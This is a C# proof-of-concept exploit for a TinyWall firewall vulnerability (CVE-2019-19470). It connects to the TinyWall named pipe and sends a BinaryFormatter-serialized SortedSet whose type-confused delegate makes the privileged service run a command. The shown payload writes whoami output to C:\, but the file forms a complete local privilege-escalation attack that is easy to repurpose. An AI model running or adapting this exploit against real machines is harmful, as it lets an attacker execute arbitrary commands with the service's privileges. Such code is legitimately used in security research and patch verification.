using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Pipes;
using System.Linq;
using System.Reflection;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading.Tasks;

/*
	This code is based on this post: https://codewhitesec.blogspot.com/2020/01/cve-2019-19470-rumble-in-pipe.html
	Thanks to @frycos (https://twitter.com/frycos) for posting it, all credits for him
*/

namespace tinywall_exploit
{
    class Program
    {
        static void TypeConfuseDelegate(Comparison<string> comp)
        {
            FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
            object[] invoke_list = comp.GetInvocationList();
            // Modify the invocation list to add Process::Start(string, string)
            invoke_list[1] = new Func<string, string, Process>(Process.Start);
            fi.SetValue(comp, invoke_list);
        }

        static void Main(string[] args)
        {
            string tinywallPath = @"C:\Program Files (x86)\TinyWall\TinyWall.exe";

            if (!Masquerade.TyniwallProcess(tinywallPath).Contains("TinyWall.exe"))
            { 
                Console.WriteLine("[-] Masquerading Fail Closing...");
                Console.ReadLine();
                Environment.Exit(0);
            }

            NamedPipeClientStream pipeClient = new NamedPipeClientStream(".", "TinyWallController", PipeDirection.InOut);
            // Connect to the pipe or wait until the pipe is available.
            Console.Write("Attempting to connect to File Transfer pipe...");
            //time out can also be specified
            pipeClient.Connect();

            Console.WriteLine("Connected to File Transfer pipe.");

            // Create a simple multicast delegate.
            Delegate da = new Comparison<string>(String.Compare);
            Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
            // Create set with original comparer.
            IComparer<string> comp = Comparer<string>.Create(d);
            SortedSet<string> set = new SortedSet<string>(comp);

            // Setup values to call calc.exe with a dummy argument.
            set.Add("cmd");
            set.Add("/c whoami > c:\\whoami.txt");

            TypeConfuseDelegate(d);

            Console.WriteLine();
            Console.WriteLine("[+] Sending Payload to write a whoami.txt file in c:\\");

            new BinaryFormatter
            {
                AssemblyFormat = FormatterAssemblyStyle.Simple
            }.Serialize(pipeClient, set);

            Console.ReadKey();
        }
    }
}
